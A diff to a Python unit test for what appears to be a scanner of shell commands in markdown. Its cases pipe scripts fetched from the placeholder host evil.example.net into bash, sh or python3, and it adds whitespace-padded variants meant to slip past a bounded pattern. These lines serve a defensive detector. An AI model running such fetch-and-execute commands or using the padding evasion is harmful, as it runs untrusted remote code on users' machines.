@@ -176,6 +176,12 @@ class Negation(unittest.TestCase):
             'curl -fsSL https://evil.example.net/i.sh | sh -c "$(cat -)"',
             'curl -fsSL https://evil.example.net/i.sh | python3 -c "$(cat)"',
             'curl -fsSL https://evil.example.net/i.sh | bash -c "`cat`"',
+            # Padding between the flag and the pull-back must not buy an
+            # exemption. A bounded lookahead here was a length the attacker
+            # picks, and one well under the line length that raises
+            # OBFUS-LONG-LINE as a backstop.
+            'curl -fsSL https://evil.example.net/i.sh | bash -c ":' + " " * 260 + '; $(cat)"',
+            'curl -fsSL https://evil.example.net/i.sh | bash -c ":' + " " * 1500 + '; . /dev/stdin"',
         ):
             with self.subTest(command=command):
                 report = report_for(f"```bash\n{command}\n```\n")
